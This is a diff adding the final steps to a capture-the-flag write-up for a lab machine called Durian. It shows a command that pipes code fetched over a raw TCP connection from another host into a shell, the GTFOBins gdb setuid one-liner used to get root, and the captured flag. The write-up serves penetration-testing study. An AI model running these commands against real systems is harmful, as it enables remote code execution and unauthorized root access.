@@ -311,3 +311,49 @@ Then I started a standard TCP connection on the target machine to download the L
 www-data@durian:/var/www/html/cgi-data$ cd /tmp
 www-data@durian:/tmp$ cat < /dev/tcp/192.168.159.128/80 | sh
 ```
+
+LinPEAS successfully ran and discovered a privesc window via a binary application with privileged capabilities.
+
+More specifically, it detected ```/usr/bin/gdb``` with ```cap_setuid+ep``` capabilities. Meaning, it had the ability to manipulate its own process UID to that of a different user, including ```root```.
+
+Therefore, using GTFObins, I exploited the exposed capability.
+
+![image](https://user-images.githubusercontent.com/45502375/197659617-1a8f2ac0-d3d4-4d80-b1d4-57a571dc0981.png)
+
+```
+which gdb
+/usr/bin/gdb
+
+/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+
+whoami
+root
+```
+
+All I had to do now was get the flag in ```/root```.
+
+```
+cd /root
+
+ls
+proof.txt
+
+cat proof.txt
+SunCSR_Team.af6d45da1f1181347b9e2139f23c6a5b
+```
